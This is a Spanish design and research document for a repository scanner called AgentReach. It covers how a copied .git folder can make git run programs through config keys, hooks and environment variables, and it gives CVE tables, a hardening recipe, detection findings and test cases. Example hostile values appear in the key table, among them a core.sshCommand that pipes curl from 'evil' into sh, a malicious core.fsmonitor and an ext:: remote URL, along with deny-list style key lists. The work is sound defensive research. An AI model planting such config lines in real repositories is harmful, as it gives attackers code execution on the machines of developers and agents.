# Repositorios git hostiles: qué pueden hacer y cómo debe actuar AgentReach

Fecha de la investigación: 2026-11-09. Solo lectura de documentación; no se ejecutó git, no se clonó nada.

## 0. Cómo leer este documento

- **Verificado** = abrí la página y leí el texto (URL indicada).
- **Fuente secundaria** = lo dice un blog o noticia, no la documentación oficial de git. Útil, pero hay que contrastarlo.
- **No verificado** = lo deduzco de la documentación o de mi conocimiento general; no lo comprobé en una fuente. Debe tratarse como hipótesis y, si es importante, convertirse en un caso de prueba.
- Siglas: **CVE** = número público de una vulnerabilidad conocida. **RCE** = ejecución remota de código (el atacante hace correr su programa). **NTLM** = mecanismo de contraseñas de Windows. **KEV** = lista de la agencia de EE. UU. CISA de fallos explotados de verdad. **fsmonitor** = "monitor de sistema de archivos", un programa que git llama para saber qué archivos cambiaron.

## 1. Idea central (lo más importante)

1. Git no ejecuta lo que viene dentro de los *commits* (el historial) por sí solo. Un `git clone` normal NO trae configuración peligrosa: la configuración local (`.git/config`) y los hooks no viajan en un clone. Fuente verificada: informe GitSpawn de la Cloud Security Alliance ("un `git clone` normal no arrastra la config local") y el artículo de SonarSource.
2. Lo peligroso es una carpeta que llegó **con su `.git` ya dentro** (zip, tar, disco compartido, USB, carpeta sincronizada, o una copia hecha por otra herramienta). Ahí el atacante controla `.git/config`, y varias claves de esa configuración son "ejecuta este programa".
3. El caso de AgentReach es exactamente ese: analiza una carpeta que no eligió el atacante-víctima con cuidado, y que puede venir de cualquier sitio. Un analizador que lanza `git status` sobre ella ya ha sido víctima real: **CVE-2025-41390 (TruffleHog, un escáner de secretos)** se disparaba escaneando un repo copiado archivo por archivo con un `core.fsmonitor` malicioso (Red Hat lo recomienda revisar antes). **Verificado con fuente original el 2026-11-09:** el informe del investigador (Cisco Talos, TALOS-2025-2243, https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2243) dice que un `core.fsmonitor` malicioso en `.git/config` hace que TruffleHog 3.90.2 ejecute el comando durante el escaneo de un repositorio copiado archivo por archivo (con `tar`, `cp` o `rsync`; un `git clone` no lleva esa configuración); aviso al fabricante el 2025-08-19, parche el 2025-10-17, publicado el 2025-10-20. El registro NVD (https://nvd.nist.gov/vuln/detail/CVE-2025-41390, leído por su interfaz de programación) coincide: publicado 2025-10-20, gravedad 7,8, versión afectada 3.90.2. Estado en NVD: "diferido" (aún sin análisis completo). La página de Red Hat no se abrió.
4. Mucho de lo que se descubre es **no un fallo de git, sino una función legítima usada mal**. Por eso git no lo "arregla" (Justin Steven: git no planea cambiar `core.fsmonitor`; SonarSource: "es difícil definir una lista segura de directivas"). Consecuencia para AgentReach: **no se puede confiar en una lista de claves peligrosas para ejecutar git con seguridad**; hay que combinar varias defensas (sección 5).
5. Los agentes de IA que el usuario ya usa corren este mismo riesgo: el informe GitSpawn (Manifold Security, resumen CSA del 2026-09-04) dice que un `.git/config` con `core.fsmonitor` ejecutó órdenes al arrancar agentes de código, sin pedir permiso. Por eso un **hallazgo de AgentReach tiene doble valor**: avisa de algo que puede disparar el propio agente del usuario.

## 2. Opciones de configuración que ejecutan programas

Convención: "local" = `.git/config` del repo (controlado por quien te dio la carpeta). Git distingue configuración *protegida* (sistema, global y línea de órdenes `-c`) de la local. Verificado en https://git-scm.com/docs/git-config: "ciertas opciones solo se respetan en configuración protegida y se ignoran en el resto".

| Clave | Qué ejecuta y cuándo | Ejemplo hostil | Estado |
|---|---|---|---|
| `core.fsmonitor` | Un programa/hook cada vez que git refresca el índice: `status`, `diff`, `add`, `commit`, etc. Doc oficial: "contiene la ruta del comando hook fsmonitor". `true` activa el demonio interno de git (no es un programa del atacante). | `[core] fsmonitor = "calc.exe"` en `.git/config`; al abrir con un agente o hacer `git status`, corre. | Verificado (doc de git-config y git-status; Sonar; GitSpawn; Steven) |
| `core.hooksPath` | Cambia el directorio de hooks. Con él, los hooks se buscan en otra carpeta, incluso dentro del propio repo. | `hooksPath = .evil` con `.evil/pre-commit`; corre al hacer commit. | Clave verificada (doc). La ruta de ataque con repo clonado: no verificada |
| Hooks en `.git/hooks/` | Programas que git corre en eventos (commit, checkout, merge...). "Los hooks sin el bit de ejecución se ignoran" (verificado, githooks). `post-checkout` corre también tras `clone`. | Archivo `post-checkout` ejecutable. Viaja en tar/zip; no en clone. | Verificado (githooks) |
| `core.sshCommand` | Sustituye a `ssh` en `fetch`/`push`. Solo dispara con red. | `sshCommand = "sh -c 'curl evil|sh'"` | Verificado (doc). Para solo lectura sin red no se dispara |
| `core.pager` | Visor de texto, "se interpreta por el shell". Dispara si git abre el paginador (salida a terminal). | `pager = "sh -c 'malo'"`; CVE-2023-29007 permitía inyectar esto por una confusión de secciones de config | Verificado (doc; blog de GitHub 2023-04-25) |
| `core.editor`, `sequence.editor` | Editor para mensajes/rebase. Solo en operaciones interactivas. | `editor = "malo"` | No verificado (conocimiento general); `GIT_EDITOR` sí verificado |
| `core.askPass` | Programa que pide contraseñas (HTTP). | `askPass = ./pide.sh` | Verificado (doc) |
| `diff.external` | Sustituye el motor de diff; se llama con 7 argumentos. Dispara en `git diff`, `log -p`, `show`. | `[diff] external = malo` | Verificado (doc) |
| `diff.<nombre>.textconv` / `.command` | Convierte binarios a texto o diff propio. Dispara en `diff` y `log -p`. | `.gitattributes`: `*.png diff=x` + config `diff.x.textconv=malo`. `git log` solo ejecuta textconv con `-p`; `format-patch` nunca. | Verificado (doc gitattributes) |
| `filter.<nombre>.clean/smudge/process` | Corre al añadir (`clean`) o al salir/mover ramas (`smudge`). `process` arranca un proceso largo. | `.gitattributes`: `* filter=x` + `filter.x.smudge=malo`. Un `.gitattributes` solo *nombra* el filtro; el comando vive en la config (no viene en un clone). | Verificado (doc gitattributes y git-config) |
| `merge.<nombre>.driver` | Programa de fusión; dispara en `merge`, `cherry-pick`, `revert`. | Igual que arriba. | Verificado (doc gitattributes) |
| `gpg.program` + `log.showSignature` | Si `log.showSignature=true`, `git log` ejecuta gpg para verificar firmas, y `gpg.program` elige QUÉ programa. Hipótesis mía: una config local con ambas claves ejecuta un programa del atacante con un simple `git log`. | `[log] showSignature=true` `[gpg] program=malo` | **Parcialmente confirmado (2026-11-09).** Doc oficial de git: `gpg.program` es la "ruta del programa que se usa en lugar de `gpg` al hacer o verificar una firma" (https://raw.githubusercontent.com/git/git/master/Documentation/config/gpg.adoc); `log.showSignature=true` hace que `git log`, `git show` y `git whatchanged` asuman `--show-signature` (https://raw.githubusercontent.com/git/git/master/Documentation/config/log.adoc); y `--show-signature` "pasa la firma a `gpg --verify`" (https://git-scm.com/docs/git-log). Es decir, según la documentación, `git log` sí puede lanzar el programa de `gpg.program`. Lo que la documentación NO dice: (a) que se lance también para confirmaciones sin firma (por conocimiento general git solo verifica las que traen firma, pero no lo comprobé en una fuente), y (b) que `gpg.program` se ignore en configuración local: la lista de claves "protegidas" no la incluye en lo leído. Sigue siendo obligatorio probarlo en una máquina virtual (caso 7, con una confirmación firmada y otra no) |
| `credential.helper` | Programa que guarda/da contraseñas; si empieza por `!` es una orden de shell. Solo con red. | `helper = "!malo"` | Verificado el 2026-11-09: https://git-scm.com/docs/gitcredentials: "si la cadena del ayudante empieza por `!`, se considera un fragmento de shell y todo lo que sigue es la orden"; si empieza por ruta absoluta, esa cadena es la orden. Git añade `get`/`store`/`erase`. La página de la clave (`config/credential.adoc`) no dice que se ignore en config local |
| `alias.xxx = !orden` | Alias que corre una orden de shell. Solo si alguien ejecuta ese alias. Git ignora alias con el nombre de órdenes internas. | `[alias] st = "!malo"` y el usuario teclea `git st` | Verificado el 2026-11-09 (https://raw.githubusercontent.com/git/git/master/Documentation/config/alias.adoc): "si empieza por `!`, se trata como una orden de shell", corre desde la raíz del repositorio, y los alias que ocultan órdenes existentes se ignoran salvo las obsoletas |
| `include.path`, `includeIf` | Insertan otro archivo de configuración "como si estuviera ahí" (verificado). No ejecutan nada por sí solos: sirven para **esconder** claves peligrosas en otro archivo o ruta. | `[include] path = ../ajustes.txt` con el `fsmonitor` dentro | Verificado (doc) |
| `uploadpack.packObjectsHook` | Orden de shell en servidores. Git la ignora en config local: "solo se respeta en configuración protegida. Es una medida contra repos no fiables" | — | Verificado. Ejemplo de que git ya endurece algunas claves |
| `protocol.allow` / `ext::` | `ext::orden` como URL de remoto ejecuta una orden; por defecto `ext` es `never`, `file` es `user`, `http/https/git/ssh` `always` (verificado). | Remoto `url = ext::sh -c ...` solo si alguien baja el límite | Verificado (doc) |
| `submodule.<n>.update = !orden` | Orden de shell al actualizar submódulo. Git no deja que `.gitmodules` la fije; la fija solo la config local tras `init` | — | No verificado |
| `remote.<n>.uploadpack`, `.receivepack`, `.vcs`, `core.gitProxy`, `http.proxy` | Programas o proxys del lado de red. | — | No verificado |
| `core.worktree`, `core.attributesFile`, `info/attributes` | Cambian dónde mira git: apuntar `core.attributesFile` a un archivo propio inyecta atributos `filter`/`diff`. | — | `attributesFile` verificado (doc); el abuso es deducción |

### 2.1 Extensiones del repositorio
Un repo declara `repositoryformatversion` y `extensions.*` en su config. Ejemplos: `extensions.worktreeConfig` (añade otro archivo de config, `config.worktree`), `extensions.partialClone` y `remote.<n>.promisor` (git baja objetos que faltan desde la red al leer el historial, lo que convierte un `git log` en una petición de red). **Verificado el 2026-11-09** en la documentación oficial (https://raw.githubusercontent.com/git/git/master/Documentation/config/extensions.adoc y https://git-scm.com/docs/gitrepository-layout): un repositorio de versión 1 puede declarar `extensions.*`, y si git no conoce una extensión, la operación NO debe continuar. Lista actual: `compatObjectFormat`, `noop`, `noop-v1`, `objectFormat`, `partialClone`, `preciousObjects`, `refStorage`, `relativeWorktrees`, `submodulePathConfig`, `worktreeConfig`. La doc no dice que ninguna ejecute programas; `partialClone` implica obtener objetos de un remoto "prometedor" más adelante (red), y `refStorage` solo menciona como hipótesis futura una dirección de base de datos. Cuidado: `submodulePathConfig` cambia dónde se resuelven las rutas de submódulos (relevante para G9). `GIT_NO_LAZY_FETCH` y `--no-lazy-fetch` siguen con fuente secundaria (lista de correo de git, commit e6d5479e7a del 2024-02-27). Hallazgo útil: "repo con extensiones o promisor remote".

### 2.2 `safe.directory` y por qué existe
- **Por qué:** CVE-2022-24765 (abril 2022). En máquinas con varios usuarios, git encontraba un `.git` creado por otra persona en un sitio compartido (por ejemplo `C:\.git` o una carpeta de red) y lo obedecía, de modo que la config de otro usuario se ejecutaba como tú. La corrección: git comprueba que el dueño de la carpeta sea tú, y si no, se niega ("dubious ownership"). `safe.directory` es la lista de excepciones. Fuente secundaria (resultados de búsqueda de la lista de git y notas de 2.33.2); un seguimiento, CVE-2022-29187, endureció la comprobación en julio 2022.
- **Verificado en doc:** `safe.directory` "solo se respeta en configuración protegida... evita que repos no fiables lo manipulen"; `*` desactiva la protección.
- **Para AgentReach:** (a) no poner nunca `safe.directory=*`; si git se niega por propiedad, **no esquivarlo**: informarlo como "no se leyó con git por propiedad dudosa" y seguir con lectura estática. (b) Detectar `safe.directory = *` en la config global del usuario como hallazgo: apaga una defensa real.
- `safe.bareRepository=explicit` (git 2.38, octubre 2022) impide usar repos "bare" enterrados en subcarpetas. También solo en config protegida (verificado). Se puede forzar con `-c`.

## 3. CVE y avisos de git (últimos 3 años: 2023-2026)

Aviso importante: AgentReach no hace `clone`, `checkout`, `submodule update` ni `apply`. Casi todos estos fallos se disparan en esas operaciones, así que **para AgentReach son informativos**, salvo que se vea el artefacto (por ejemplo `.gitmodules` con rarezas) o que la versión de git sea vieja. Aun así, el usuario (o su agente) puede clonar esa carpeta después.

| CVE / aviso | Qué hace | Corregido en | Estado de la fuente |
|---|---|---|---|
| CVE-2023-22490, CVE-2023-23946 (14-feb-2023) | Clone local que filtra archivos vía symlink en `objects`; `git apply` escribe más allá de un symlink | 2.39.2 | Verificado (blog GitHub) |
| CVE-2023-25652, -29007 (25-abr-2023) | `apply --reject` escribe en rutas arbitrarias; fallo al renombrar secciones de config permite inyectar claves como `core.pager` (ejecución) | 2.40.1 | Verificado |
| CVE-2023-25815, -29011, -29012 y avisos de Git for Windows (abr-2023) | Git for Windows busca archivos en rutas que un usuario no privilegiado puede escribir (`C:\mingw64`, `C:\etc\connectrc`) y Git CMD ejecuta `doskey.exe` del directorio actual | Nueva versión de Git for Windows (no precisa) | Verificado |
| CVE-2024-32002, -32004, -32020, -32021, -32465 (14-may-2024) | `32002`: clone recursivo con submódulos y symlinks escribe un hook y lo ejecuta mientras clona (el más grave). `32004`/`32465`: problemas de clone local y de ejecutar git en repos clonados por otros | 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, 2.39.4 | Lista de versiones: verificado (notas de versión), y de nuevo el 2026-11-09 en el registro NVD (https://nvd.nist.gov/vuln/detail/CVE-2024-32002, publicado 2024-05-14, gravedad 9,0 crítica): corregido en 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2 y 2.39.4; el clone recursivo con submódulos puede escribir en `.git/` y plantar un hook que corre **durante** el clone; desactivar enlaces simbólicos (`core.symlinks false`) lo bloquea. Descripción de 32002 verificada; las de 32004, 32020, 32021 y 32465 siguen sin verificar al detalle |
| CVE-2024-50349, -52006 (14-ene-2025) | Credenciales: secuencias de escape ANSI en el aviso engañan al usuario; un retorno de carro (CR) en una URL hace que el asistente de credenciales envíe la clave a otro servidor | 2.48.1 | Verificado (blog GitHub) |
| CVE-2025-48384 (8-jul-2025) | Submódulo con ruta que termina en CR + symlink: se escribe el submódulo en otro sitio y corre un `post-checkout` (ejecución de código al clonar recursivo). **En la lista KEV de CISA desde 2025-08-25** (explotado de verdad) | 2.50.1 y ramas 2.43.7, 2.44.4, 2.45.4, 2.46.4, 2.47.3, 2.48.2, 2.49.1 | Verificado (notas y blog GitHub); y el 2026-11-09 en el aviso oficial https://github.com/git/git/security/advisories/GHSA-vwqx-4fm8-6qc9 (publicado 2025-07-08, título "ejecución arbitraria de código por entrecomillado roto de la configuración") y en NVD: lista de versiones corregidas idéntica; **KEV confirmada en NVD: añadida el 2025-08-25**, fecha límite de CISA 2025-09-15. Matiz de corrección: NVD describe el fallo como lectura y escritura inconsistente de un retorno de carro (CR) final en la configuración; hace falta además un enlace simbólico hacia el directorio de hooks del submódulo y un hook `post-checkout` ejecutable |
| CVE-2025-48385 | Git acepta un "bundle URI" del servidor sin validar bien y escribe un archivo donde el servidor diga. Mitigación: `transfer.bundleURI=false` | 2.50.1 | Verificado |
| CVE-2025-48386 | `wincred` (ayudante de credenciales de Windows): desbordamiento de memoria | 2.50.1 | Verificado |
| CVE-2025-27613, -27614, -46334, -46835 | Herramientas gráficas `gitk` y Git GUI: escritura de archivos y ejecución de un `sh.exe` o textconv que esté en el repo (Windows) | 2.50.1 | Verificado |
| Avisos de Git for Windows 2026: GHSA-hv9c-4jm9-jh3x (10-mar), GHSA-9j5h-h4m7-85hx (15-abr), "Clone2Creds" GHSA-xrpg-8j9v-v282 (11-ago), varios de `wincred` (jul/sep) | Al clonar, un servidor malicioso hace que Windows envíe el hash NTLM (huella de contraseña) a otro servidor; bundle URI abre rutas locales/UNC | Algunos sin versión corregida publicada | **Verificado el 2026-11-09 en cada aviso oficial** de https://github.com/git-for-windows/git/security/advisories: GHSA-hv9c-4jm9-jh3x (CVE-2025-66413, 10-mar-2026, afectadas 2.53.0 y anteriores, corregido en 2.53.0(2), gravedad 7,4); GHSA-9j5h-h4m7-85hx (CVE-2026-32631, 15-abr-2026, afectadas anteriores a 2.53.0, corregido en 2.53.0, 7,4); GHSA-xrpg-8j9v-v282 "Clone2Creds" (CVE-2026-62960, 11-ago-2026, afectadas 2.40.0.windows.1 hasta antes de 2.53.0.windows.4, 2.54.0.windows.1 hasta antes de .3 y 2.55.0.windows.1 hasta antes de .4; el campo de versión corregida dice "ninguna" pero el texto dice que se corrigió en 2.53.0.windows.4, 2.54.0.windows.3 y 2.55.0.windows.4; con `transfer.bundleuri=true`, desactivado por defecto); `wincred`: GHSA-rxqw-wxqg-g7hw (14-jul-2026, sin CVE, antes de 2.55.0.windows.3, sin versión corregida listada), GHSA-5j7x-r6vf-jhq2 (CVE-2026-100408) y GHSA-v3h4-vrpr-rh9x (CVE-2026-100407), ambos 28-sep-2026, afectadas hasta 2.54.0.windows.1, **sin corrección publicada**. Confirma "2.53.0 para el de abril", y corrige el resumen anterior: el de marzo es 2.53.0(2), el de agosto exige 2.53.0.windows.4 o posterior, y los de `wincred` de septiembre siguen sin corregir (usar otro ayudante de credenciales) |
| CVE-2026-45033 (Copilot CLI de GitHub) | Un repo "bare" anidado dentro del proyecto aporta el `core.fsmonitor`; corregido en Copilot CLI 1.0.43 | no es un fallo de git | Solo vi el resumen en resultados de búsqueda |
| GitSpawn (2026-09), varias CVE (Codex CLI CVE-2026-19592/-19593, Goose CVE-2026-72718, otros) | Agentes de código ejecutan `core.fsmonitor` al arrancar sobre carpetas con `.git` ajeno | cada agente; Claude Code 2.1.196 corrigió la variante fsmonitor; **otra variante de Claude Code usa otra opción de git y seguía sin corregir** | Fuente secundaria (resumen de CSA, informe de Manifold). Segunda ronda (2026-11-09): una búsqueda confirma el mecanismo (`core.fsmonitor` en `.git/config` de una carpeta con `.git` completo; un `git clone` normal no lo lleva), ocho fallos en siete agentes (Claude Code, Codex, Cursor, Goose, Hermes Agent, Qwen Code, Grok Build), cuatro sin parche al publicarse, y que no hay explotación real conocida; las fuentes discrepan en el estado de parches y la página de The Hacker News devolvió error 403, así que el informe original de Manifold sigue sin abrirse. El detalle "otra opción de git" es justo la prueba de que no basta con vetar una sola clave |

Rutas de Windows (8.3 y NTFS): mis búsquedas no sacaron un CVE específico de nombres cortos 8.3 ni flujos alternos de datos NTFS en los últimos 3 años. Git tiene protecciones (`core.protectNTFS`) que no pude verificar. **No verificado**: tratar como caso de prueba, no como dato.

Versión mínima razonable para el aviso de AgentReach (informativo): 2.50.1 o la corrección de tu rama (2.43.7+). Otras fuentes hablan de 2.53+ para fallos de Windows (secundaria, no fiable).

## 4. Variables de entorno que cambian el comportamiento

Importante: AgentReach hereda el entorno del usuario, y un entorno envenenado (por ejemplo un terminal de una herramienta comprometida) cambia lo que git hace. Verificado en https://git-scm.com/docs/git salvo que se indique.

| Variable | Efecto | Ejemplo |
|---|---|---|
| `GIT_DIR`, `GIT_WORK_TREE` | Fuerzan qué repo/carpeta usa git; desactivan la búsqueda de `.git` | `GIT_DIR=/otra` hace que `git log` lea otro repositorio |
| `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_n`, `GIT_CONFIG_VALUE_n` | Inyectan config "de línea de órdenes" (protegida); pisan archivos y las pisa `-c` | `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=malo` |
| `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_NOSYSTEM` | Eligen/omiten los archivos global y de sistema (doc: "ponlo a `/dev/null` para saltarlo") | Defensa |
| `GIT_EXTERNAL_DIFF` | Programa de diff externo (ejecuta) | `GIT_EXTERNAL_DIFF=malo git log -p` |
| `GIT_SSH`, `GIT_SSH_COMMAND` | Programa en lugar de ssh (el segundo pasa por shell) | Solo con red |
| `GIT_PAGER`, `GIT_EDITOR`, `GIT_ASKPASS` | Paginador/editor/pedir contraseña | `GIT_PAGER="malo"` |
| `GIT_EXEC_PATH` | Dónde busca los programas internos de git; apuntarlo a una carpeta propia sustituye `git-xxx`. | Efecto exacto en doc: parcialmente leído; el abuso es deducción |
| `GIT_ALLOW_PROTOCOL`, `GIT_PROTOCOL_FROM_USER` | Permiten o impiden protocolos | Defensa o debilitamiento |
| `GIT_TERMINAL_PROMPT=0` | Git no pregunta nada por terminal | Defensa |
| `GIT_OPTIONAL_LOCKS=0` | "Evita que `git status` refresque el índice como efecto secundario" (verificado) | Defensa; equivale a `--no-optional-locks` |
| `GIT_NO_LAZY_FETCH=1` | Evita bajar objetos que faltan en clones parciales | Fuente: lista de correo de git (secundaria) |
| `GIT_TRACE` | Escribe trazas a stderr o a un archivo | Puede revelar rutas; no ejecuta |

Regla para AgentReach: construir un entorno **limpio desde cero** (lista de permitidas) y no copiar el entorno del usuario, salvo `PATH`/`SYSTEMROOT` imprescindibles, y registrar como hallazgo si en el entorno del usuario hay `GIT_CONFIG_COUNT`, `GIT_EXTERNAL_DIFF`, `GIT_SSH_COMMAND`, `GIT_ASKPASS`, `GIT_EXEC_PATH`, `GIT_DIR`.

## 5. Cómo ejecutar git de forma segura, o no ejecutarlo

### 5.1 Respuesta corta
**Recomendación: no ejecutar git sobre la carpeta analizada en la primera fase (MVP). Hacer análisis estático** (leer archivos de texto con tu propio código). Dejar git solo como mejora opcional, detrás de un envoltorio endurecido, y solo si el análisis estático no encontró ninguna clave que ejecute programas.

### 5.2 Por qué
1. Casi todo lo que AgentReach quiere de git se puede leer sin git:
   - Remotos y credenciales incrustadas: sección `[remote "x"]` de `.git/config`.
   - Lista de claves que ejecutan: el propio `.git/config` (y los includes).
   - Hooks: listar `.git/hooks/` y el destino de `core.hooksPath`.
   - Submódulos: `.gitmodules` (texto).
   - Filtros: `.gitattributes`, `.git/info/attributes`.
   - `git config --list` y `git remote -v` son **innecesarios**: se reemplazan leyendo el archivo.
2. Lo que sí requiere git es el historial (`log`) y la lista de archivos del índice (`ls-files`), que están en formatos binarios (objetos comprimidos, paquetes). Se pueden analizar a mano, pero es costoso; para el MVP basta con la información estática.
3. Un analizador de solo lectura que, al analizar, ejecuta algo, rompe su promesa central. Y la historia lo respalda: TruffleHog, agentes de código y editores (VS Code CVE-2021-43891, JetBrains CVE-2022-24345) cayeron por llamar a git sobre una carpeta no confiable. Verificado en el texto de Sonar y Steven.
4. Una lista de claves vetadas nunca es completa (Sonar: "es difícil definir una lista segura"; GitSpawn: la segunda variante de Claude Code usaba otra opción de git).
5. Contra: el análisis estático debe leer el formato de config de git bien (comillas, escapes, includes, mayúsculas/minúsculas, líneas continuadas); un analizador "casi correcto" puede pasar por alto una clave que git sí interpreta. Mitigación: prueba con casos de trampa de la sección 7 y, ante cualquier duda de lectura, **tratar como hallazgo** ("config no interpretable") y no ejecutar git.

### 5.3 Si se decide ejecutar git (fase posterior), receta mínima
Todo esto solo reduce riesgo; **no lo elimina**. Orden de las defensas:

1. **Puerta previa:** no ejecutar si el análisis estático vio `core.fsmonitor` (distinto de vacío/`false`), `core.hooksPath`, `include`/`includeIf`, `extensions.*`, `.git` como archivo, repos anidados, `filter.*`, `diff.*`, `gpg.program`, `log.showSignature=true`, o dueño distinto al usuario.
2. **Entorno limpio** (lista de permitidas): `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL` y `GIT_CONFIG_SYSTEM` a un archivo vacío (en Windows, ruta a un archivo vacío creado por AgentReach; no confío en que `/dev/null` funcione, **no verificado**), `GIT_TERMINAL_PROMPT=0`, `GIT_OPTIONAL_LOCKS=0`, `GIT_NO_LAZY_FETCH=1`, `GIT_PAGER=cat`. Quitar del entorno heredado todo `GIT_*`.
3. **Opciones por orden** (el `-c` es config protegida y gana a la local; verificado en la sección SCOPES): `--no-pager --no-optional-locks`, `-c core.fsmonitor=false`, `-c core.hooksPath=<carpeta vacía>`, `-c core.pager=cat`, `-c core.askPass=`, `-c credential.helper=`, `-c log.showSignature=false`, `-c gpg.program=<ruta que falla>`, `-c diff.external=`, `-c core.attributesFile=<vacío>`, `-c protocol.allow=never`, `-c transfer.bundleURI=false`, `-c safe.bareRepository=explicit`. En `log`: `--no-ext-diff --no-textconv --no-show-signature` y sin `-p`.
4. **Localización explícita:** `--git-dir=<ruta>/.git` (y `--work-tree` solo si hace falta) para no depender de la búsqueda de `.git`.
5. **Cwd neutro y ruta absoluta a git:** en Windows, el directorio actual puede ser buscado para ejecutables (avisos `doskey.exe`, CVE-2025-46334). Lanzar sin shell, con una carpeta de trabajo vacía y creada por AgentReach, nunca la del repo. Sin `shell=True`.
6. **Lista cerrada de órdenes con argumentos fijos.** Nunca pasar texto del repo (nombres de rama, rutas) como argumento sin `--`. (Argument injection: Sonar lo cita; en CVE-2018-17456 una URL de submódulo se leía como opción.)
7. **Evitar `git status`, `diff`, `add`, `commit`, `checkout`, `merge`, `submodule`, `fetch`, `clone`, `pull`**: son las órdenes que disparan fsmonitor, filtros, hooks o red. Con `log` (sin `-p`), `ls-files` (sin `-m`/`-o`) la superficie es menor, pero **`ls-files` y `log` no se verificaron como libres de ejecución en todas las configuraciones**: tratarlos como "probablemente seguros con las defensas", no como seguros.
8. **Tiempo límite, salida limitada, sin red** (si es posible a nivel de sistema operativo, o ejecutar en un proceso aislado).
9. **Fallo cerrado:** si git se niega ("dubious ownership"), o cualquier cosa rara, informar y seguir sin git.
10. Opcional: comprobar `git --version` contra la versión mínima. Es seguro porque ejecuta el git instalado, no el repo.

## 6. Qué debe reportar AgentReach (hallazgos nuevos) y con qué confianza

"Confianza" = cuánta certeza hay de que el hallazgo representa un riesgo real, no de que el repo sea malicioso (hay usos legítimos).

| # | Señal | Confianza | Qué decir al usuario | Ejemplo |
|---|---|---|---|---|
| G1 | `core.fsmonitor` con valor que no sea vacío, `false` ni `true` | **Alta** | "Esta carpeta hace que git ejecute un programa al refrescar el estado; cualquier agente o editor que consulte git lo dispara." | `fsmonitor = ./x.sh` |
| G2 | `core.hooksPath` local | **Media**. Legítimo con husky (`.husky`); alta si la ruta está dentro del repo y apunta a un archivo no versionado o con símbolos raros, o si es absoluta fuera del repo | "Los hooks se leen de otra carpeta." | `hooksPath = .evil` |
| G3 | Archivos en `.git/hooks/` sin `.sample`, con bit de ejecución (en Windows mirar solo que existan, **no verificado** cómo se decide) | **Media**. Los hooks no viajan en clone, así que su presencia en una copia ajena es una pista | "Hay hooks activos; correrán al hacer commit/checkout." | `.git/hooks/post-checkout` |
| G4 | Alias con `!`, `core.sshCommand`, `core.pager`, `core.editor`, `core.askPass`, `diff.external`, `gpg.program`, `credential.helper` con `!` o ruta, `sequence.editor`, `difftool/mergetool.*.cmd`, `remote.*.uploadpack/vcs/proxy`, `core.gitProxy` | **Media-alta** (ejecutan solo en acciones concretas) | Mostrar la clave y qué acción la dispara | `pager = "sh -c ..."` |
| G5 | `filter.<x>.clean/smudge/process`, `diff.<x>.textconv/command`, `merge.<x>.driver` en config local | **Media-alta** | "El repo define programas de conversión; se ejecutan al hacer add/checkout/diff/merge." | `smudge = malo` |
| G6 | `.gitattributes` con `filter=`/`diff=`/`merge=` | **Baja** sola (el comando no viaja con el repo; `lfs` es legítimo); **Alta** si el nombre del filtro coincide con uno definido en la config local o global | "Nombra un filtro; revisa que su comando sea el que esperas." | `* filter=lfs` |
| G7 | Credenciales incrustadas en URL de remoto (`https://usuario:token@...`) o en `.gitmodules` | **Alta** | Secreto en texto plano; enmascarar el valor | `url = https://ghp_xxx@github.com/...` |
| G8 | URL de remoto/submódulo con `ext::`, `file://`, `transport::dir`, o que empieza por `-` (parece una opción), contiene CR/saltos de línea, o usa `http://` sin TLS | **Alta** para `ext::`, CR, `-`; **Media** para el resto | Riesgo al clonar o actualizar | `url = ext::sh -c ...` |
| G9 | `.gitmodules`: ruta con `..`, ruta absoluta, CR al final, o submódulo que es un symlink; symlinks dentro de `.git` (hooks, config) o que salen del repo | **Alta** (CVE-2025-48384/CVE-2024-32002 son de esta clase) | "Patrón de ataque conocido de clone recursivo." | `path = x\r` |
| G10 | Repos anidados: carpetas con `HEAD`+`objects`+`refs`+`config` (repo "bare" enterrado) o `.git` dentro de subcarpetas | **Alta** si su `config` tiene claves de G1/G4; **Baja** si no | "Si un agente entra en esa subcarpeta, git usará esa config." Steven / CVE-2026-45033 | `sub/HEAD`, `sub/config` |
| G11 | `.git` es un archivo (`gitdir: ...`) que apunta fuera, `commondir`, `core.worktree` raro | **Media** | La carpeta no usa su propia metadata | `.git` = `gitdir: ../../otro` |
| G12 | `include.path` / `includeIf` en `.git/config` | **Media**: por sí solo no ejecuta; esconde claves. Si apunta dentro del repo o a rutas fuera, subir | "La config incluye otro archivo; se analizó ese también (o no se pudo)." | `[include] path = ../x` |
| G13 | `extensions.*`, `repositoryformatversion` distinto de 0, `promisor`/`partialclone` | **Baja-media**, no verificado | Git puede hacer red al leer el historial | `extensions.partialClone` |
| G14 | `safe.directory = *` en config global; repo con dueño distinto al usuario (git se negaría) | **Alta** (el primero) / **Media** (el segundo) | Defensa apagada / propiedad dudosa | `[safe] directory = *` |
| G15 | Variables de entorno `GIT_*` peligrosas en el entorno del usuario (sección 4) | **Media-alta** | El entorno cambia lo que git ejecuta | `GIT_SSH_COMMAND` |
| G16 | `git` más viejo que la versión mínima | **Informativa** | Actualizar; clone recursivo vulnerable | 2.39.x |
| G17 | `transfer.bundleURI` activo, `protocol.*.allow=always` para `file`/`ext` en config global | **Media** | Cierra la puerta a CVE-2025-48385 | — |
| G18 | La config no se pudo interpretar (sintaxis rara, bytes extraños) | **Media**: fallo cerrado | "No se pudo analizar; no se ejecutó git." | — |

Regla de salida: cuando se reporta una clave, enseñar la **clave y la acción que la dispara**, nunca ejecutar el valor, y enmascarar secretos.

## 7. Casos trampa para el proyecto de prueba

Crear carpetas de prueba **con `.git` dentro** (no clones), cada una con un programa señuelo inofensivo que solo deje un archivo marcador `PWNED.txt` en un lugar controlado; el test falla si aparece el marcador. Ejecutarlo en una máquina virtual o carpeta aislada, y con un git conocido.

1. `fsmonitor-malo`: `core.fsmonitor` con el señuelo. Esperado: G1 y sin marcador.
2. `fsmonitor-true`: `core.fsmonitor=true` (esperado: sin hallazgo de ejecución o informativo) y `false`.
3. `hookspath-dentro`: `core.hooksPath=.husky` con script dentro; y `hooksPath` absoluto fuera. Esperado: G2 con distinta confianza.
4. `hook-ejecutable`: `.git/hooks/post-checkout` y `pre-commit` sin `.sample`. G3. Y uno sin bit de ejecución.
